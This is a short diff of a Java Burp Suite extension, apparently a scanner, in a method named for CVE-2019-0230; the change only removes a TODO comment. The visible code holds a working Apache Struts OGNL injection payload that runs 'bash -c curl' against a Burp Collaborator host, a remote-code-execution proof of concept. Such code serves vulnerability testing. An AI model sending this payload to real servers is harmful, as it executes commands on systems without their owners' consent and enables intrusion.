@@ -12,7 +12,6 @@ import java.util.List;
 public class Struts {
 
     public static void CVE_2019_0230() {
-        // TODO 待完成
         IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
         String val = collaboratorClientContext.generatePayload(true);
         String poc = "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{'bash','-c','curl http://" + val +"'}))}";
